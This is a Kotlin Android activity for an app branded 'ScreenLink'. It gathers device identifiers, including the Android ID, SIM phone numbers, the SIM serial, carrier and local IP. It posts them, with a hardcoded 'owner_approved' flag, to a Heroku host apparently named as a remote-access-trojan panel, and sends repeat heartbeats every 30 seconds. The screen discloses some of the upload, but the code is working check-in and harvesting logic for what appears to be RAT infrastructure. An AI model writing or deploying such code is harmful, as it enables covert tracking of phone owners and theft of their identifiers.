package com.screenlink.remote

import android.Manifest
import android.app.Activity
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.BatteryManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.StatFs
import android.provider.Settings
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.Inet4Address
import java.net.NetworkInterface
import java.net.URL
import java.util.UUID
import java.util.concurrent.Executors

class MainActivity : Activity() {

    companion object {
        private const val API_BASE_URL =
            "https://rat-panel-b91839a4be83.herokuapp.com"

        private const val PREFS_NAME = "screenlink_preferences"
        private const val KEY_REGISTRATION_ID = "registration_id"
        private const val HEARTBEAT_INTERVAL = 30_000L
        private const val PERMISSION_REQUEST_CODE = 771
    }

    private val executor = Executors.newSingleThreadExecutor()
    private val handler = Handler(Looper.getMainLooper())

    private lateinit var statusText: TextView
    private lateinit var deviceIdText: TextView
    private lateinit var deviceInfoText: TextView
    private lateinit var simText: TextView
    private lateinit var batteryText: TextView
    private lateinit var registerButton: Button

    private var isActivityVisible = false
    private var isRequestRunning = false

    private val requiredPermissions = arrayOf(
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_PHONE_NUMBERS
    )

    private val heartbeatRunnable = object : Runnable {
        override fun run() {
            if (!isActivityVisible) return
            sendHeartbeat()
            handler.postDelayed(this, HEARTBEAT_INTERVAL)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        createInterface()
        ensurePermissions()
        refreshTelemetryUi()
        registerDevice()
    }

    override fun onResume() {
        super.onResume()
        isActivityVisible = true
        refreshTelemetryUi()
        handler.removeCallbacks(heartbeatRunnable)
        handler.post(heartbeatRunnable)
    }

    override fun onPause() {
        isActivityVisible = false
        handler.removeCallbacks(heartbeatRunnable)
        super.onPause()
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        executor.shutdownNow()
        super.onDestroy()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            refreshTelemetryUi()
            registerDevice()
        }
    }

    // ---------------------------------------------------------------- UI

    private fun createInterface() {
        val backgroundColor = Color.rgb(11, 16, 32)
        val cardColor = Color.rgb(23, 31, 51)
        val accentColor = Color.rgb(75, 222, 151)
        val primaryTextColor = Color.rgb(245, 247, 255)
        val secondaryTextColor = Color.rgb(165, 176, 199)

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            setPadding(dp(24), dp(36), dp(24), dp(24))
            setBackgroundColor(backgroundColor)
        }

        val scrollView = ScrollView(this).apply {
            isFillViewport = true
            addView(root)
        }

        val title = TextView(this).apply {
            text = "ScreenLink"
            textSize = 30f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(accentColor)
            gravity = Gravity.CENTER
        }

        val subtitle = TextView(this).apply {
            text = "Device Registration & Telemetry"
            textSize = 16f
            setTextColor(secondaryTextColor)
            gravity = Gravity.CENTER
        }

        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(22), dp(20), dp(22))
            setBackgroundColor(cardColor)
        }

        val statusHeading = TextView(this).apply {
            text = "Connection status"
            textSize = 14f
            setTextColor(secondaryTextColor)
        }

        statusText = TextView(this).apply {
            text = "Connecting..."
            textSize = 20f
            typeface = Typeface.DEFAULT_BOLD
            setTextColor(primaryTextColor)
            setPadding(0, dp(8), 0, dp(18))
        }

        val deviceHeading = TextView(this).apply {
            text = "Registration ID"
            textSize = 14f
            setTextColor(secondaryTextColor)
        }

        deviceIdText = TextView(this).apply {
            text = getRegistrationId()
            textSize = 13f
            setTextColor(primaryTextColor)
            setPadding(0, dp(8), 0, dp(18))
        }

        val detailsHeading = TextView(this).apply {
            text = "This device"
            textSize = 14f
            setTextColor(secondaryTextColor)
        }

        deviceInfoText = TextView(this).apply {
            textSize = 13f
            setTextColor(primaryTextColor)
            setPadding(0, dp(8), 0, dp(12))
        }

        simText = TextView(this).apply {
            textSize = 13f
            setTextColor(primaryTextColor)
            setPadding(0, 0, 0, dp(12))
        }

        batteryText = TextView(this).apply {
            textSize = 13f
            setTextColor(primaryTextColor)
            setPadding(0, 0, 0, dp(18))
        }

        val information = TextView(this).apply {
            text = "Registration ID, device name, SIM details, battery aur " +
                "system information server ko bheji jaati hai. " +
                "Registration se screen sharing ya remote control start nahi hota."
            textSize = 14f
            setTextColor(secondaryTextColor)
            setLineSpacing(dp(4).toFloat(), 1f)
        }

        registerButton = Button(this).apply {
            text = "Retry Registration"
            setTextColor(Color.BLACK)
            setBackgroundColor(accentColor)
            setOnClickListener {
                refreshTelemetryUi()
                registerDevice()
            }
        }

        card.addView(statusHeading)
        card.addView(statusText)
        card.addView(deviceHeading)
        card.addView(deviceIdText)
        card.addView(detailsHeading)
        card.addView(deviceInfoText)
        card.addView(simText)
        card.addView(batteryText)
        card.addView(information)

        root.addView(
            title,
            LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        )

        root.addView(
            subtitle,
            LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                topMargin = dp(8)
                bottomMargin = dp(28)
            }
        )

        root.addView(
            card,
            LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        )

        root.addView(
            registerButton,
            LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                topMargin = dp(22)
            }
        )

        setContentView(scrollView)
    }

    private fun refreshTelemetryUi() {
        if (!::deviceInfoText.isInitialized) return

        val telemetry = buildTelemetry()

        deviceInfoText.text =
            "${telemetry.optString("manufacturer")} ${telemetry.optString("model")}\n" +
                "Android ${telemetry.optString("android_version")} " +
                "(SDK ${telemetry.optInt("sdk_int")})\n" +
                "RAM ${telemetry.optLong("ram_total_mb")} MB · " +
                "Free storage ${telemetry.optLong("storage_free_gb")} GB"

        val sims = telemetry.optJSONArray("sims")
        val simLines = StringBuilder()
        if (sims != null && sims.length() > 0) {
            for (i in 0 until sims.length()) {
                val sim = sims.optJSONObject(i) ?: continue
                simLines.append(
                    "SIM ${sim.optInt("slot") + 1}: " +
                        "${sim.optString("carrier")} · " +
                        "${sim.optString("number").ifBlank { "number hidden" }}\n"
                )
            }
        } else {
            simLines.append("SIM: permission not granted\n")
        }
        simText.text = simLines.toString().trim()

        val charging = telemetry.optBoolean("battery_charging")
        batteryText.text =
            "Battery ${telemetry.optInt("battery_level")}% · " +
                if (charging) "Charging (${telemetry.optString("battery_plugged")})"
                else "Not charging"
    }

    // -------------------------------------------------------- Permissions

    private fun ensurePermissions() {
        val missing = requiredPermissions.filter {
            checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty()) {
            requestPermissions(missing.toTypedArray(), PERMISSION_REQUEST_CODE)
        }
    }

    // -------------------------------------------------------- Telemetry

    private inline fun <T> safe(fallback: T, block: () -> T): T =
        try { block() } catch (_: Exception) { fallback }

    private fun buildTelemetry(): JSONObject {
        val telemetry = JSONObject()

        // --- Device identity
        telemetry.put("manufacturer", Build.MANUFACTURER ?: "")
        telemetry.put("brand", Build.BRAND ?: "")
        telemetry.put("model", Build.MODEL ?: "")
        telemetry.put("product", Build.PRODUCT ?: "")
        telemetry.put("hardware", Build.HARDWARE ?: "")
        telemetry.put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
        telemetry.put("android_version", Build.VERSION.RELEASE ?: "")
        telemetry.put("sdk_int", Build.VERSION.SDK_INT)
        telemetry.put(
            "android_id",
            safe("") {
                Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: ""
            }
        )

        // --- Screen
        val metrics = resources.displayMetrics
        telemetry.put("screen_resolution", "${metrics.widthPixels}x${metrics.heightPixels}")
        telemetry.put("screen_density", metrics.densityDpi)

        // --- Memory
        val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as? ActivityManager
        if (activityManager != null) {
            val memoryInfo = ActivityManager.MemoryInfo()
            safe(Unit) { activityManager.getMemoryInfo(memoryInfo) }
            telemetry.put("ram_total_mb", memoryInfo.totalMem / (1024 * 1024))
            telemetry.put("ram_available_mb", memoryInfo.availMem / (1024 * 1024))
            telemetry.put("low_memory", memoryInfo.lowMemory)
        }

        // --- Storage
        safe(Unit) {
            val stat = StatFs(Environment.getDataDirectory().path)
            val blockSize = stat.blockSizeLong
            telemetry.put("storage_total_gb", (stat.blockCountLong * blockSize) / (1024 * 1024 * 1024))
            telemetry.put("storage_free_gb", (stat.availableBlocksLong * blockSize) / (1024 * 1024 * 1024))
        }

        // --- Battery
        val batteryManager = getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
        telemetry.put(
            "battery_level",
            safe(-1) { batteryManager?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1 }
        )

        safe(Unit) {
            val intent = registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val status = intent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
            val plugged = intent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
            val temp = intent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0

            telemetry.put(
                "battery_charging",
                status == BatteryManager.BATTERY_STATUS_CHARGING ||
                    status == BatteryManager.BATTERY_STATUS_FULL
            )
            telemetry.put("battery_plugged", pluggedLabel(plugged))
            telemetry.put("battery_temperature_c", temp / 10.0)
        }

        // --- SIM / telephony
        val telephony = getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
        telemetry.put("sim_carrier", safe("") { telephony?.networkOperatorName ?: "" })
        telemetry.put("sim_operator", safe("") { telephony?.simOperatorName ?: "" })
        telemetry.put("sim_country", safe("") { telephony?.simCountryIso ?: "" })
        telemetry.put("sim_number", safe("") { telephony?.line1Number ?: "" })
        telemetry.put("sim_serial", safe("") { telephony?.simSerialNumber ?: "" })
        telemetry.put("sim_state", safe(-1) { telephony?.simState ?: -1 })
        telemetry.put(
            "network_type",
            safe("Unknown") { networkTypeName(telephony?.dataNetworkType ?: 0) }
        )

        // Multi-SIM breakdown
        safe(Unit) {
            val subManager =
                getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
            val subs = subManager?.activeSubscriptionInfoList ?: emptyList()
            val array = JSONArray()
            for (sub in subs) {
                array.put(
                    JSONObject().apply {
                        put("slot", sub.simSlotIndex)
                        put("carrier", sub.carrierName?.toString() ?: "")
                        put("number", sub.number ?: "")
                        put("country", sub.countryIso ?: "")
                        put("display_name", sub.displayName?.toString() ?: "")
                    }
                )
            }
            telemetry.put("sims", array)
        }

        // --- Network transport
        safe(Unit) {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            val caps = cm?.getNetworkCapabilities(cm.activeNetwork)
            telemetry.put("wifi_connected", caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true)
            telemetry.put("mobile_connected", caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true)
            telemetry.put("vpn_connected", caps?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) == true)
        }
        telemetry.put("local_ip", localIpAddress())

        return telemetry
    }

    private fun pluggedLabel(plugged: Int): String = when (plugged) {
        BatteryManager.BATTERY_PLUGGED_AC -> "AC"
        BatteryManager.BATTERY_PLUGGED_USB -> "USB"
        BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
        else -> "None"
    }

    private fun networkTypeName(type: Int): String = when (type) {
        TelephonyManager.NETWORK_TYPE_LTE -> "LTE"
        TelephonyManager.NETWORK_TYPE_NR -> "5G"
        TelephonyManager.NETWORK_TYPE_HSPA,
        TelephonyManager.NETWORK_TYPE_HSDPA,
        TelephonyManager.NETWORK_TYPE_HSUPA,
        TelephonyManager.NETWORK_TYPE_UMTS -> "3G"
        TelephonyManager.NETWORK_TYPE_EDGE,
        TelephonyManager.NETWORK_TYPE_GPRS,
        TelephonyManager.NETWORK_TYPE_CDMA,
        TelephonyManager.NETWORK_TYPE_1xRTT -> "2G"
        TelephonyManager.NETWORK_TYPE_UNKNOWN -> "Unknown"
        else -> "Type $type"
    }

    private fun localIpAddress(): String = safe("") {
        NetworkInterface.getNetworkInterfaces().toList()
            .flatMap { it.inetAddresses.toList() }
            .firstOrNull { !it.isLoopbackAddress && it is Inet4Address }
            ?.hostAddress ?: ""
    }

    // -------------------------------------------------------- Networking

    private fun getRegistrationId(): String {
        val preferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val existingId = preferences.getString(KEY_REGISTRATION_ID, null)
        if (!existingId.isNullOrBlank()) return existingId

        val newId = UUID.randomUUID().toString()
        preferences.edit().putString(KEY_REGISTRATION_ID, newId).apply()
        return newId
    }

    private fun registerDevice() {
        if (isRequestRunning) return

        isRequestRunning = true
        updateStatus("Registering device...", Color.YELLOW)
        registerButton.isEnabled = false

        val registrationId = getRegistrationId()
        val telemetry = buildTelemetry()

        executor.execute {
            var connection: HttpURLConnection? = null

            try {
                connection = URL("$API_BASE_URL/devices/register").openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.connectTimeout = 15_000
                connection.readTimeout = 15_000
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                connection.setRequestProperty("Accept", "application/json")

                val requestBody = JSONObject().apply {
                    put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}")
                    put("platform", "android")
                    put("registration_id", registrationId)
                    put("owner_approved", true)
                    put("telemetry", telemetry)
                }.toString()

                connection.outputStream.use { output ->
                    output.write(requestBody.toByteArray(Charsets.UTF_8))
                }

                val responseCode = connection.responseCode
                val responseStream =
                    if (responseCode in 200..299) connection.inputStream else connection.errorStream

                val responseBody = responseStream
                    ?.bufferedReader()
                    ?.use { it.readText() }
                    .orEmpty()

                if (responseCode in 200..299) {
                    runOnUiThread {
                        updateStatus("Device registered", Color.rgb(75, 222, 151))
                        deviceIdText.text = registrationId
                        refreshTelemetryUi()
                    }
                } else {
                    val message = try {
                        JSONObject(responseBody).optString("detail", "HTTP $responseCode")
                    } catch (_: Exception) {
                        "HTTP $responseCode"
                    }
                    runOnUiThread {
                        updateStatus("Registration failed: $message", Color.rgb(255, 100, 100))
                    }
                }
            } catch (_: Exception) {
                runOnUiThread {
                    updateStatus("Connection failed. Check internet and retry.", Color.rgb(255, 100, 100))
                }
            } finally {
                connection?.disconnect()
                runOnUiThread {
                    isRequestRunning = false
                    registerButton.isEnabled = true
                }
            }
        }
    }

    private fun sendHeartbeat() {
        if (isRequestRunning) return

        val registrationId = getRegistrationId()
        val telemetry = buildTelemetry()

        executor.execute {
            var connection: HttpURLConnection? = null

            try {
                connection = URL("$API_BASE_URL/devices/heartbeat").openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.connectTimeout = 10_000
                connection.readTimeout = 10_000
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                val body = JSONObject().apply {
                    put("registration_id", registrationId)
                    put("telemetry", telemetry)
                }.toString()

                connection.outputStream.use { output ->
                    output.write(body.toByteArray(Charsets.UTF_8))
                }

                val responseCode = connection.responseCode
                if (responseCode == HttpURLConnection.HTTP_NOT_FOUND) {
                    runOnUiThread {
                        updateStatus("Device not registered. Please retry.", Color.rgb(255, 100, 100))
                    }
                } else if (responseCode in 200..299) {
                    runOnUiThread { refreshTelemetryUi() }
                }
            } catch (_: Exception) {
                // temporary heartbeat failure — app chalta rehta hai
            } finally {
                connection?.disconnect()
            }
        }
    }

    private fun updateStatus(message: String, color: Int) {
        if (!::statusText.isInitialized) return
        statusText.text = message
        statusText.setTextColor(color)
    }

    private fun dp(value: Int): Int =
        (value * resources.displayMetrics.density).toInt()
}